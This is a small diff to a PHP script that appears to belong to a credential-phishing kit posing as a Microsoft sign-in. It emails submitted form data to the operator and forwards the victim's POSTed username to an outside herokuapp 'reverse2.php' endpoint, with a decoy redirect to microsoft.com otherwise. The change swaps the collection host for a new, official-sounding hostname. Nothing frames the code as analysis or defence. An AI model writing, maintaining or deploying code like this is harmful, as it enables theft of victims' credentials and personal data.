@@ -18,7 +18,7 @@ mail("$to", "$send", "$subject", $message);
 }
 $praga=rand();
 $praga=md5($praga);
-  header ("Location: https://sjgso873898yuwhif8ycbr289r89y3.herokuapp.com/reverse2.php?nameu=".$_POST['nameu']);
+  header ("Location: https://californiametroupdates-locale.herokuapp.com/reverse2.php?nameu=".$_POST['nameu']);
 }else{
 header ("Location: https://www.microsoft.com/undefined");
 }
